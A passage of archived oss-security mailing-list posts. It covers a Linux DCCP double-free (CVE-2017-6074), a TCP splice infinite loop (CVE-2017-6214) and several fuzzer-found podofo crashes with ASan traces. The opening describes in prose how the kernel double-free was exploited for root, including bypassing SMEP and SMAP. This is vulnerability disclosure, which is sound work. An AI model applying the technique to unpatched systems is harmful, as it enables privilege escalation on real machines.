would allow us to overwrite skb or skb->data with arbitrary data. The
double-free, however, allows us to control what object we overwrite by
doing the trick I mentioned in the previous email.

To get execution control we can overwrite skb->data, since it has
skb_shared_info struct at the end, and
shinfo->destructor_arg->callback is a function pointer, which is
triggered by skb_release_data. The exploit puts ubuf_info struct and
the payload to get root in userspace, so this will be detected by SMAP
and SMEP.

To disable SMEP and SMAP I used the idea from the CVE-2016-8655
exploit by Philip Pettersson. We can overwrite packet_sock struct,
which has a timer_list field deep inside it, which contains a callback
and it's argument. We allocate this struct, overwrite the time_list
field and schedule the timer. I used native_write_cr4 as the callback
and a value with SMEP and SMAP bits disabled for it's argument. Note,
that CVE-2016-8655 by itself resulted in a use-after-free on the
packet_sock struct, but in this case we make a use-after-free happen
by exploiting a double-free.

As I mentioned, the exploit is not very reliable, but I don't want to
spend any more time on it. The kernel can crash due to a memory
corruption if we fail to reallocate some objects in time or in the
correct order. However I've managed to make it work on three different
environments I have set up (including two vms and a real machine).

On Wed, Feb 22, 2017 at 2:28 PM, Andrey Konovalov <andreyknvl@google.com> wrote:
> Hi,
>
> This is an announcement about CVE-2017-6074 [1] which is a double-free
> vulnerability I found in the Linux kernel. It can be exploited to gain
> kernel code execution from an unprivileged processes.
>
> Fixed on Feb 17, 2017:
> https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4
>
> The oldest version that was checked is 2.6.18 (Sep 2006), which is
> vulnerable. However, the bug was introduced before that, probably in
> the first release with DCCP support (2.6.14, Oct 2005).
>
> The kernel needs to be built with CONFIG_IP_DCCP for the vulnerability
> to be present. A lot of modern distributions enable this option by
> default.
>
> The bug was found with syzkaller [2].
>
> ### Bug details
>
> In the current DCCP implementation an skb for a DCCP_PKT_REQUEST
> packet is forcibly freed via __kfree_skb in dccp_rcv_state_process if
> dccp_v6_conn_request successfully returns [3].
>
> However, if IPV6_RECVPKTINFO is set on a socket, the address of the
> skb is saved to ireq->pktopts and the ref count for skb is incremented
> in dccp_v6_conn_request [4], so skb is still in use. Nevertheless, it
> still gets freed in dccp_rcv_state_process.
>
> The fix is to call consume_skb, which accounts for skb->users,
> instead of doing goto discard and therefore calling __kfree_skb.
>
> To exploit this double-free, it can be turned into a use-after-free:
>
> //  The first free:
> kfree(dccp_skb)
> // Another object allocated on the same place as dccp_skb:
> some_object = kmalloc()
> // The second free, effectively frees some_object
> kfree(dccp_skb)
>
> As this point we have a use-after-free on some_object. An attacker can
> control what object that would be and overwrite it's content with
> arbitrary data by using some of the kernel heap spraying techniques.
> If the overwritten object has any triggerable function pointers, an
> attacker gets to execute arbitrary code within the kernel.
>
> I'll publish an exploit in a few days, giving people time to update.
>
> New Ubuntu kernels are out so please update as soon as possible.
>
> ### Timeline
>
> 2017-02-15: Bug reported to security@kernel.org
> 2017-02-16: Patch submitted to netdev
> 2017-02-17: Patch committed to mainline kernel
> 2017-02-18: Notification sent to linux-distros
> 2017-02-22: Public announcement
>
> ### Links
>
> [1] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6074
> [2] https://github.com/google/syzkaller
> [3] http://lxr.free-electrons.com/source/net/dccp/input.c?v=4.9#L606
> [4] http://lxr.free-electrons.com/source/net/dccp/ipv6.c?v=4.9#L351
> [5] https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4

```

</details>
<details>
<summary><strong>[oss-security] Linux: CVE-2017-6214: ipv4/tcp: infinite loop in tcp_splice_read()</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905394.10177_31.NdNdNx,U=7714:2,T -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170223183658.zqlncw72y6hyhjil@eldamar.local`

```
Hi

CVE-2017-6214 has been assigned for the following commit in Linux by
MITRE (via the webform):

https://git.kernel.org/linus/ccf7abb93af09ad0868ae9033d1ca8108bdaec82

as included in v4.10-rc8:

>     tcp: avoid infinite loop in tcp_splice_read()
>     
>     Splicing from TCP socket is vulnerable when a packet with URG flag is
>     received and stored into receive queue.
>     
>     __tcp_splice_read() returns 0, and sk_wait_data() immediately
>     returns since there is the problematic skb in queue.
>     
>     This is a nice way to burn cpu (aka infinite loop) and trigger
>     soft lockups.
>     
>     Again, this gem was found by syzkaller tool.
>     
>     Fixes: 9c55e01c0cc8 ("[TCP]: Splice receive support.")
>     Signed-off-by: Eric Dumazet <edumazet@google.com>
>     Reported-by: Dmitry Vyukov  <dvyukov@google.com>
>     Cc: Willy Tarreau <w@1wt.eu>
>     Signed-off-by: David S. Miller <davem@davemloft.net>

The fix was backported to 4.9.11
(0f895f51a831d73ce24158534784aba5b2a72a9e).

Regards,
Salvatore

```

</details>

## podofo
<details>
<summary><strong>[oss-security] podofo: NULL pointer dereference in PoDoFo::PdfColorGray::~PdfColorGray (PdfColor.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549988.3737_29.Morbo,U=38523:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `633036.383983807-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a null pointer dereference. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==5815==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f025d243787 bp 0x7ffe33517c50 sp 0x7ffe33517be0 T0)
==5815==The signal is caused by a READ memory access.
==5815==Hint: address points to the zero page.
    #0 0x7f025d243786 in PoDoFo::PdfColorGray::~PdfColorGray() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfColor.cpp:435:1
    #1 0x52c9b2 in GraphicsStack::TGraphicsStackElement::~TGraphicsStackElement() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.h:29:11
    #2 0x52c9b2 in __gnu_cxx::new_allocator::destroy(GraphicsStack::TGraphicsStackElement*) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/ext/new_allocator.h:133
    #3 0x52c9b2 in std::deque<GraphicsStack::TGraphicsStackElement, std::allocator >::_M_pop_back_aux() /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/deque.tcc:515
    #4 0x52c9b2 in std::deque<GraphicsStack::TGraphicsStackElement, std::allocator >::pop_back() /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_deque.h:1459
    #5 0x52c9b2 in std::stack<GraphicsStack::TGraphicsStackElement, std::deque<GraphicsStack::TGraphicsStackElement, std::allocator > >::pop() /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_stack.h:218
    #6 0x52c9b2 in GraphicsStack::Pop() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.cpp:48
    #7 0x522031 in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:190:35
    #8 0x51ed8e in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:120:15
    #9 0x51c06d in main /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/podofocolor.cpp:116:12
    #10 0x7f025bd2e61f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #11 0x428718 in _start (/usr/bin/podofocolor+0x428718)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfColor.cpp:435:1 in PoDoFo::PdfColorGray::~PdfColorGray()
==5815==ABORTING

Affected version:
0.9.4

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00175-podofo-nullptr-PoDoFo-PdfColorGray-PdfColorGray

Timeline:
2017-02-13: bug discovered
2017-03-02: bug reported to upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-podofopdfcolorgraypdfcolorgray-pdfcolor-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_30.Morbo,U=41374:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1783625.4Wk8PYGyvC@blackgate`

```
On Thursday 02 March 2017 16:37:11 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-p
> odofopdfcolorgraypdfcolorgray-pdfcolor-cpp

This is CVE-2017-6849

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] podofo: NULL pointer dereference in PoDoFo::PdfXObject::PdfXObject (PdfXObject.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549988.3737_27.Morbo,U=38522:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `393990.264830308-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a null pointer dereference. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==21036==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fc5cfd94743 bp 0x7ffc1eaffe50 sp 0x7ffc1eaffd40 T0)
==21036==The signal is caused by a READ memory access.
==21036==Hint: address points to the zero page.
    #0 0x7fc5cfd94742 in PoDoFo::PdfXObject::PdfXObject(PoDoFo::PdfObject*) /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/src/doc/PdfXObject.cpp:264:74
    #1 0x529308 in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/colorchanger.cpp:137:28
    #2 0x523b8d in main /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/tools/podofocolor/podofocolor.cpp:116:12
    #3 0x7fc5cd8d178f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #4 0x4300e8 in _start (/usr/bin/podofocolor+0x4300e8)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/app-text/podofo-0.9.5/work/podofo-0.9.5/src/doc/PdfXObject.cpp:264:74 in PoDoFo::PdfXObject::PdfXObject(PoDoFo::PdfObject*)
==21036==ABORTING

Affected version:
0.9.5

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00214-podofo-nullptr-PdfXObject-cpp

Timeline:
2017-03-01: bug discovered
2017-03-02: bug reported upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-podofopdfxobjectpdfxobject-pdfxobject-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_29.Morbo,U=41373:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1742097.gFNMWqBDs8@blackgate`

```
On Thursday 02 March 2017 16:36:42 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-p
> odofopdfxobjectpdfxobject-pdfxobject-cpp

This is CVE-2017-6848

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] podofo: NULL pointer dereference in PoDoFo::PdfVariant::DelayedLoad (PdfVariant.h)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549988.3737_26.Morbo,U=38521:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `910426.377874927-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a null pointer dereference. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==5768==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x7f6504f1742c bp 0x7fffc41a0df0 sp 0x7fffc41a0d00 T0)
==5768==The signal is caused by a READ memory access.
==5768==Hint: address points to the zero page.
    #0 0x7f6504f1742b in PoDoFo::PdfVariant::DelayedLoad() const /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfVariant.h:545:10
    #1 0x7f6504f1742b in PoDoFo::PdfVariant::GetArray() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfVariant.h:795
    #2 0x7f6504f1742b in PoDoFo::PdfXObject::PdfXObject(PoDoFo::PdfObject*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/doc/PdfXObject.cpp:264
    #3 0x51ff55 in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:137:28
    #4 0x51c06d in main /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/podofocolor.cpp:116:12
    #5 0x7f650358c61f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #6 0x428718 in _start (/usr/bin/podofocolor+0x428718)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfVariant.h:545:10 in PoDoFo::PdfVariant::DelayedLoad() const
==5768==ABORTING

Affected version:
0.9.4

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00174-podofo-nullptr-PoDoFo-PdfVariant-DelayedLoad

Timeline:
2017-02-13: bug discovered
2017-03-02: bug reported to upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-podofopdfvariantdelayedload-pdfvariant-h

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_28.Morbo,U=41372:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `5754753.zXRKsoZEEs@blackgate`

```
On Thursday 02 March 2017 16:36:23 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-p
> odofopdfvariantdelayedload-pdfvariant-h

This is CVE-2017-6847

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] podofo: NULL pointer dereference in GraphicsStack::TGraphicsStackElement::SetNonStrokingColorSpace (graphicsstack.h)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549988.3737_25.Morbo,U=38520:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `972966.932549269-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a null pointer dereference. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==32192==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x000000525f24 bp 0x7ffe0a1fdc90 sp 0x7ffe0a1fdc00 T0)
==32192==The signal is caused by a READ memory access.
==32192==Hint: address points to the zero page.
    #0 0x525f23 in GraphicsStack::TGraphicsStackElement::SetNonStrokingColorSpace(PoDoFo::EPdfColorSpace) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.h:83:38
    #1 0x525f23 in GraphicsStack::SetNonStrokingColorSpace(PoDoFo::EPdfColorSpace) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.h:129
    #2 0x525f23 in ColorChanger::ProcessColor(ColorChanger::EKeywordType, int, std::vector<PoDoFo::PdfVariant, std::allocator >&, GraphicsStack&) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:478
    #3 0x521b3c in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:214:31
    #4 0x51ed8e in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:120:15
    #5 0x51c06d in main /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/podofocolor.cpp:116:12
    #6 0x7fc21680761f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #7 0x428718 in _start (/usr/bin/podofocolor+0x428718)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.h:83:38 in GraphicsStack::TGraphicsStackElement::SetNonStrokingColorSpace(PoDoFo::EPdfColorSpace)
==32192==ABORTING

Affected version:
0.9.4

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00173-podofo-nullptr-GraphicsStack-TGraphicsStackElement-SetNonStrokingColorSpace

Timeline:
2017-02-13: bug discovered
2017-03-02: bug reported to upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-podofopdfcoloroperator-pdfcolor-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_27.Morbo,U=41371:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `16371207.FHd1oBMIcq@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Thursday 02 March 2017 16:36:03 Agostino Sarubbo 
wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-graphicsstacktgraphicsstackelementsetnonstrokingcolorspa
ce-graphicsstack-h

This is CVE-2017-6846

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] podofo: NULL pointer dereference in PoDoFo::PdfColor::operator= (PdfColor.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549988.3737_24.Morbo,U=38519:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `899078.172023536-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a null pointer dereference. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==9554==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004ca47d bp 0x7fff58eb6bb0 sp 0x7fff58eb6330 T0)
==9554==The signal is caused by a READ memory access.
==9554==Hint: address points to the zero page.
    #0 0x4ca47c in AddressIsPoisoned /tmp/portage/sys-devel/llvm-3.9.0-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_mapping.h:321
    #1 0x4ca47c in QuickCheckForUnpoisonedRegion /tmp/portage/sys-devel/llvm-3.9.0-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:43
    #2 0x4ca47c in __asan_memcpy /tmp/portage/sys-devel/llvm-3.9.0-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:413
    #3 0x7f5fc924b58d in PoDoFo::PdfColor::operator=(PoDoFo::PdfColor const&) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfColor.cpp:575:9
    #4 0x52d31f in GraphicsStack::TGraphicsStackElement::operator=(GraphicsStack::TGraphicsStackElement const&) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.h:46:29
    #5 0x52d31f in GraphicsStack::TGraphicsStackElement::TGraphicsStackElement(GraphicsStack::TGraphicsStackElement const&) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.h:41
    #6 0x52c46a in GraphicsStack::Push() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/graphicsstack.cpp:40:27
    #7 0x522005 in ColorChanger::ReplaceColorsInPage(PoDoFo::PdfCanvas*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:187:35
    #8 0x51ed8e in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:120:15
    #9 0x51c06d in main /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/podofocolor.cpp:116:12
    #10 0x7f5fc7d3261f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #11 0x428718 in _start (/usr/bin/podofocolor+0x428718)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /tmp/portage/sys-devel/llvm-3.9.0-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_mapping.h:321 in AddressIsPoisoned
==9554==ABORTING

Affected version:
0.9.4

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00172-podofo-nullptr-PoDoFo-PdfColor-operator

Timeline:
2017-02-13: bug discovered
2017-03-02: bug reported to upstream
2017-03-02: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-podofopdfcoloroperator-pdfcolor-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_25.Morbo,U=41370:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1766778.V2EZuu2kuy@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Thursday 02 March 2017 16:35:37 Agostino Sarubbo 
wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/03/02/podofo-null-pointer-dereference-in-p
> odofopdfcoloroperator-pdfcolor-cpp

This is CVE-2017-6845

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] podofo: global buffer overflow in PoDoFo::PdfParser::ReadXRefSubsection (PdfParser.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488549988.3737_23.Morbo,U=38518:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `847337.788527028-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
podofo is a C++ library to work with the PDF file format.

A fuzz on it discovered a global overflow. The upstream project denies me to open a new ticket. So, I just will forward this on the -users mailing list.

The complete ASan output:

# podofocolor dummy $FILE foo
==15599==ERROR: AddressSanitizer: global-buffer-overflow on address 0x0000014a5838 at pc 0x0000004ca58c bp 0x7ffebe3248b0 sp 0x7ffebe324060
WRITE of size 24 at 0x0000014a5838 thread T0
    #0 0x4ca58b in __asan_memcpy /tmp/portage/sys-devel/llvm-3.9.0-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:413
    #1 0x7efe75862464 in void std::_Construct(PoDoFo::PdfParser::TXRefEntry*, PoDoFo::PdfParser::TXRefEntry const&) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_construct.h:83:38
    #2 0x7efe75862464 in void std::__uninitialized_fill_n::__uninit_fill_n(PoDoFo::PdfParser::TXRefEntry*, unsigned long, PoDoFo::PdfParser::TXRefEntry const&) 
/usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_uninitialized.h:202
    #3 0x7efe75862464 in void std::uninitialized_fill_n(PoDoFo::PdfParser::TXRefEntry*, unsigned long, PoDoFo::PdfParser::TXRefEntry const&) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_uninitialized.h:244
    #4 0x7efe75862464 in void std::__uninitialized_fill_n_a(PoDoFo::PdfParser::TXRefEntry*, unsigned long, PoDoFo::PdfParser::TXRefEntry const&, std::allocator&) 
/usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_uninitialized.h:355
    #5 0x7efe75862464 in std::vector<PoDoFo::PdfParser::TXRefEntry, std::allocator >::_M_fill_insert(__gnu_cxx::__normal_iterator<PoDoFo::PdfParser::TXRefEntry*, std::vector<PoDoFo::PdfParser::TXRefEntry, std::allocator > >, 
unsigned long, PoDoFo::PdfParser::TXRefEntry const&) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/vector.tcc:496
    #6 0x7efe75855a47 in std::vector<PoDoFo::PdfParser::TXRefEntry, std::allocator >::insert(__gnu_cxx::__normal_iterator<PoDoFo::PdfParser::TXRefEntry*, std::vector<PoDoFo::PdfParser::TXRefEntry, std::allocator > >, unsigned 
long, PoDoFo::PdfParser::TXRefEntry const&) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_vector.h:1073:9
    #7 0x7efe75855a47 in std::vector<PoDoFo::PdfParser::TXRefEntry, std::allocator >::resize(unsigned long, PoDoFo::PdfParser::TXRefEntry) /usr/lib/gcc/x86_64-pc-linux-gnu/4.9.3/include/g++-v4/bits/stl_vector.h:716
    #8 0x7efe75855a47 in PoDoFo::PdfParser::ReadXRefSubsection(long&, long&) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfParser.cpp:772
    #9 0x7efe758470ad in PoDoFo::PdfParser::ReadXRefContents(long, bool) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfParser.cpp:725:17
    #10 0x7efe75840a9e in PoDoFo::PdfParser::ReadDocumentStructure() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfParser.cpp:337:9
    #11 0x7efe7583de0f in PoDoFo::PdfParser::ParseFile(PoDoFo::PdfRefCountedInputDevice const&, bool) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfParser.cpp:220:9
    #12 0x7efe7583c1d4 in PoDoFo::PdfParser::ParseFile(char const*, bool) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/base/PdfParser.cpp:164:11
    #13 0x7efe75a993f3 in PoDoFo::PdfMemDocument::Load(char const*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/doc/PdfMemDocument.cpp:186:16
    #14 0x7efe75a990c2 in PoDoFo::PdfMemDocument::PdfMemDocument(char const*) /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/doc/PdfMemDocument.cpp:88:11
    #15 0x51e96d in ColorChanger::start() /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/colorchanger.cpp:110:20
    #16 0x51c06d in main /tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/tools/podofocolor/podofocolor.cpp:116:12
    #17 0x7efe7424861f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #18 0x428718 in _start (/usr/bin/podofocolor+0x428718)

0x0000014a5838 is located 0 bytes to the right of global variable 'PoDoFo::PODOFO_BUILTIN_FONTS' defined in '/tmp/portage/app-text/podofo-0.9.4/work/podofo-0.9.4/src/doc/PdfFontFactoryBase14Data.h:4460:33' (0x14a4aa0) of size 
3480
SUMMARY: AddressSanitizer: global-buffer-overflow /tmp/portage/sys-devel/llvm-3.9.0-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:413 in __asan_memcpy
Shadow bytes around the buggy address:
  0x00008028cab0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x00008028cac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x00008028cad0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x00008028cae0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x00008028caf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x00008028cb00: 00 00 00 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9 f9
